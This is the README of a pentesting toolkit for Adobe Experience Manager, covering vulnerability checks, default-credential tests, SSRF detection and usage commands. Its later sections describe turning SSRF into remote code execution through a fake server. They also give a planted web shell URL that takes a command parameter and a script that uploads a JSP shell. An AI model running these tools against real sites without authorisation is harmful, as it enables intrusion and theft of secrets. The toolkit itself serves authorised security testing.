# Toolset for AEM hacking

Tools to identify vulnerable Adobe Experience Manager (AEM) webapps. <a href="https://www.adobe.com/marketing/experience-manager.html">AEM is an enterprise-grade CMS</a>.

I've built these tools to automate bughunting and pentesting of AEM webapps. I've included checks for previously known vulnerabilities and misconfigurations, as well as for new ones, discovered by me in 2018/2019. **All discovered vulnerabilities were responsibly reported to Adobe PSIRT**.
 
You can find more details about vulnerabilities and techniques in presentations, I've prepared for <a href="https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps">Hacktivity conference</a> and <a href="https://www.youtube.com/watch?v=EQNBQCQMouk">LevelUp 0x03</a>.

AEM webapps are widespread and rarely configured securely or kept up to date. Bughunter, you have good chances to find security bugs, enjoy the tools!


Mikhail Egorov (<a href="https://twitter.com/0ang3el">@0ang3el</a>)

## Scripts

* `aem_hacker.py` - main script to scan AEM webapp for vulnerabilities.
* `aem_discoverer.py` - script to discover AEM webapps from list of URLs.
* `aem_ssrf2rce.py`, `aem_server.py`, `response.bin` - scripts to get RCE from SSRF.
* `aem-rce-sling-script.sh` - script to get RCE by uploading JSP shell to /apps JCR node.
* `aem_slurper.py` - crawl templates and HTML contents for test pages and internal user IDs.

## aem_hacker.py
**Important:** You need a VPS to detect SSRF vulnerabilities!

Tool tries to bypass AEM dispatcher. 

Following checks are currently implemented:
* `Exposed DefaultGetServlet` - checks if JCR nodes, that might contain sensitive information and secrets, are exposed via DefaultGetServlet.
* `Exposed QueryBulderJsonServlet and QueryBuilderFeedServlet` - if those servlets are exposed it might be possible to access various sensitive information and secrets. 
* `Exposed GQLServlet` - GQLServlet is similar to QueryBuilderFeedServlet.
* `Ability to create new JCR nodes` - checks if it's possible to create new JCR node.
* `Exposed POSTServlet` - POSTServlet allows to create/modify/delete content in JCR. Depending on your access level, it's possible to get stored XSS or RCE. 
* `Exposed LoginStatusServlet, CurrentUserServlet and UserInfoServlet` - if those servlets are exposed allows it might be possible to bruteforce credentials.
* `Users with default password` - checks for admin:admin, author:author, etc.
* `Exposed Felix Console` - exposed Felix Console might lead to RCE by uploading backdoor OSGI bundle.
* `Enabled WCMDebugFilter` - vulnerable to CVE-2016-7882 WCMDebugFilter might lead to reflected XSS.
* `Exposed WCMSuggestionsServlet` - exposed WCMSuggestionsServlet might lead to reflected XSS.
* `Exposed CRXDE and CRX` - checks for exposure of CRXDE and CRX.
* `Exposed Reports` - checks for exposure of reports.
* `SSRF SalesforceSecretServlet` - checks for SSRF via SalesforceSecretServlet (CVE-2018-5006). SSRF might allow to ex-filtrate secrets or perform XSS.
* `SSRF ReportingServicesServlet` - checks for SSRF via ReportingServicesServlet (CVE-2018-12809). SSRF might allow to ex-filtrate secrets or perform XSS.
* `SSRF SitecatalystServlet` - checks for SSRF via SitecatalystServlet. SSRF might allow to get RCE with the help of aem_ssrf2rce.py, when specific AEM version and appserver is used.
* `SSRF AutoprovisioningServlet` - checks for SSRF via AutoprovisioningServlet. SSRF might allow to get RCE with the help of aem_ssrf2rce.py, when specific AEM version and appserver is used.
* `SSRF Opensocial Proxy` - checks for SSRF via Opensocial (Shindig) proxy. SSRF might allow to ex-filtrate secrets or perform XSS.
* `SSRF Opensocial MakeRequest` - check for SSRF via Opensocial (Shindig) makeRequest. SSRF might allow to ex-filtrate secrets or perform XSS. You can use parameters `httpMethod`, `postData`, `headers`, `contentType` with `makeRequest`.
* `SWF XSSes` - checks for XSSes via SWF.
* `Deser ExternalJobServlet` - checks for vulnerable ExternalJobServlet.
* `Exposed Webdav` - checks for access to JCR via WebDav protocol. Exposed WebDav might lead to XXE (CVE-2015-1833) or stored XSS.
* `Exposed Groovy Console` - exposed Groovy console leads to RCE. 
* `Exposed ACS AEM Tools` - exposed ACS AEM Tools leads to RCE.
* `Exposed GuideInternalSubmitServlet` - exposed GuideInternalSubmitServlet vulnerable to XXE (CVE-2019-8086).
* `Exposed MergeMetadataServlet` - might be vulnerable to reflected XSS.
* `Exposed SetPreferences page` - might be vulnerable to reflected XSS.

#### Usage
```
usage: aem_hacker.py [-h] [-u URL] [--proxy PROXY] [--debug] [--host HOST]
                     [--port PORT] [--workers WORKERS]
                     [-H [HEADER [HEADER ...]]] [--handler HANDLER]
                     [--listhandlers] [--delay DELAY] [--ssrf-timeout SSRF_TIMEOUT]
                     [--creds USER:PASS] [--format {text,json}] [--output OUTPUT]

AEM hacker by @0ang3el, see the slides -
https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     url to scan
  --proxy PROXY         http and https proxy
  --debug               debug output
  --host HOST           hostname or IP to use for back connections during SSRF
                        detection
  --port PORT           opens port for SSRF detection
  --workers WORKERS     number of parallel workers
  -H [HEADER [HEADER ...]], --header [HEADER [HEADER ...]]
                        extra http headers to attach
  --handler HANDLER     run specific handlers, if omitted run all handlers
  --listhandlers        list available handlers
  --delay DELAY         seconds between requests
  --ssrf-timeout SSRF_TIMEOUT
                        seconds to wait for SSRF callbacks to arrive
  --creds-file PATH     read credentials from a file, one 'user:password' per
                        line; preferred, keeps the password off the command line
  --creds USER:PASS     credential for checks that need an authenticated
                        session; repeatable
  --format {text,json}  output format; 'json' is one finding per line
  --strict              skip checks marked experimental (see below)
  --output OUTPUT       write the report to a file instead of stdout

Findings are printed as each check finishes, and the exit status is meaningful so
the tool composes in a pipeline:

| Exit | Meaning |
|---|---|
| `0` | clean — every selected check reached the target and found nothing |
| `1` | something was found |
| `2` | the scan did **not** complete: a check crashed, a check never reached the target, or it was interrupted |
| `3` | the scan could not start: bad arguments, unknown handler, or an unreachable URL |

`3` exists so that `|| echo "something was found"` cannot fire for a typo or a
dead host. "I could not scan this" and "this is vulnerable" are the two facts a
consumer of this tool most needs to keep apart.

Exit `2` exists so a failed or truncated scan is never mistaken for a clean bill
of health:


```
aem_hacker.py -u https://aem.webapp --format json --output findings.json || echo "something was found"
```

(The usage block above is abridged for readability — `aem_hacker.py -h` is
authoritative.)

**Authenticated checks (`--creds`).** Most AEM CVEs are low-privilege or
require user interaction, so an anonymous scanner structurally cannot detect
them — APSB22-59 alone lists ~35 such issues. Pass a credential and the checks
that Adobe rates `PR:L` (the AEM Forms/TouchUI XSS checks, the login-page open
redirect) and the authenticated product-info probe will send it:

```
python3 aem_hacker.py -u https://aem.webapp --host your_vps --creds author:author
```

Because a password on the command line is visible in `ps`, `/proc/*/cmdline`
and shell history, there are two routes that keep it off the command line:

```
printf 'author:letmein\n' > ~/.aem-creds && chmod 600 ~/.aem-creds
python3 aem_hacker.py -u https://aem.webapp --creds-file ~/.aem-creds
# or:
AEM_HACKER_CREDS='author:letmein' python3 aem_hacker.py -u https://aem.webapp
```

`--creds-file` takes one `user:password` per line (`#` comments and blank lines
allowed) and warns if the file is readable by other users. All three sources
combine, and supplied credentials are *added to* the built-in default list rather
than replacing it.

The password *value* is never written to a finding, to stdout, or to an error
message; only the username is reported. Two rejection messages disclose the
password's *length* rather than its content, so a mistyped value can be
diagnosed without printing it. With no credential flags at all, every check
behaves exactly as before. Only the first
credential is used for session-style probes, so supplying more does not multiply
the request count; the default-credential checks try all of them in place of
their built-in list.

**Experimental checks.** Five of the checks carry CVE numbers that an audit
found to be wrong: CVE-2023-38205 is an Adobe *ColdFusion* issue, CVE-2021-40722
is an XXE rather than an SSRF, CVE-2021-36063 is *Adobe Connect*, CVE-2022-30679
ships in a different bulletin than its sibling, and the AEM open redirect is
CVE-2023-29307 (3.5 Low, not CVE-2023-29297 at 6.1). The techniques those checks
probe are real, but their detection logic has never been validated against a live
AEM. Findings from them are prefixed `[UNVERIFIED CHECK]`, and `--strict` skips
them entirely. The full audit, with vendor bulletin citations, is in
[CVE_COVERAGE.md](CVE_COVERAGE.md#-provenance-and-audit-status).

#### Example
```
python3 aem_hacker.py -u https://aem.webapp --host your_vps_hostname_ip
```

or

```
python3 aem_hacker.py -u https://aem.webapp --host your_vps_hostname_ip --handler groovy_console --handler salesforcesecret_servlet

```

## Tests

The scanner has a dependency-free test suite (stdlib `unittest` plus a mock AEM
target) covering the request layer, the SSRF callback listener, the CLI, the
sibling scripts, and the contract that every registered check is reachable and
safe to run. It runs in CI on every push and pull request:

```
./tests/run_tests.sh
python3 tests/bench.py HEAD    # compare request/connection/wall-time cost against a revision
```

## aem_enum.py

Enumerates usernames and secret-looking nodes from an AEM webapp whose JCR tree
is exposed via `DefaultGetServlet`. It walks the JCR tree, collecting any
attribute whose key ends in `By` (e.g. `jcr:createdBy`, `cq:lastModifiedBy`) as a
username hint, and any child node matching a credential-ish pattern (passwords,
credentials, `*.key`, `*.pem`, config/backup archives) as a URL worth fetching.
Results go to a `|`-delimited CSV.

Requires `dpath`, which is an optional extra:

```
pip install -r requirements-enum.txt
```

#### Usage
```
python3 aem_enum.py --url https://aem.webapp --out findings.csv --maxdepth 6
```

## aem_discoverer.py
Script allows to scan urls and find AEM webapps among them.

Tool tries to bypass AEM dispatcher.

#### Usage
```
python3 aem_discoverer.py -h
usage: aem_discoverer.py [-h] [--file FILE] [--proxy PROXY] [--debug]
                         [--workers WORKERS]

AEM discoverer by @0ang3el, see the slides -
https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps

optional arguments:
  -h, --help         show this help message and exit
  --file FILE        file with urls
  --proxy PROXY      http and https proxy
  --debug            debug output
  --workers WORKERS  number of parallel workers
```

#### Example
```
python3 aem_discoverer.py --file urls.txt --workers 150
```

## aem_ssrf2rce.py, aem_server.py, response.bin
Helps to exploit SSRF in `SitecatalystServlet` and `AutoprovisioningServlet` as RCE. It should work on AEM before AEM-6.2-SP1-CFP7 running on Jetty (default installation).

## aem_ssrf2rce.py
A server-side request forgery for remote code execution.

#### Usage
```
python3 aem_ssrf2rce.py -h
usage: aem_ssrf2rce.py [-h] [--url URL] [--fakeaem FAKEAEM] [--proxy PROXY]

optional arguments:
  -h, --help         show this help message and exit
  --url URL          URL for SitecatalystServlet or AutoprovisioningServlet,
                     including path, without query part
  --fakeaem FAKEAEM  hostname/ip of fake AEM server
  --proxy PROXY      http and https proxy
```

#### Example
Place `aem_server.py` and `response.bin` on your VPS. Run `aem_server.py` script.

```
python3 aem_server.py
starting fake AEM server...
running server...
```

Run `aem_ssrf2rce.py` script.

```
python3 aem_ssrf2rce.py --url https://aem.webapp/libs/cq/analytics/components/sitecatalystpage/segments.json.servlet --fakeaem your_vps_hostname_ip
```

If RCE is possible, you should see incoming connection to your fake AEM server. After replication, you can access your shell from `https://aem.webapp/rcenode.html?Vgu9BKV9zdvJNByNh9NB=ls`.


## aem-rce-sling-script.sh
Script is handy when Felix Console is not available, but you have permissions to create new nodes under `/apps` JCR node.

#### Usage

```
./aem-rce-sling-script.sh https://aem.webapp username password
```

## aem_slurper.py
Read the AEM data and HTML contents in an attempt to discover forgotten test pages, sensitive data, internal user IDs.

#### Usage
```
python3 aem_slurper.py HOSTNAME [/PATH]
```

#### Example
```
time python3 aem_slurper.py HOST 2>&1 | tee HOST.txt
sort -k3 HOST.txt > HOST-sorted-by-path.txt
less HOST-sorted-by-path.txt
```

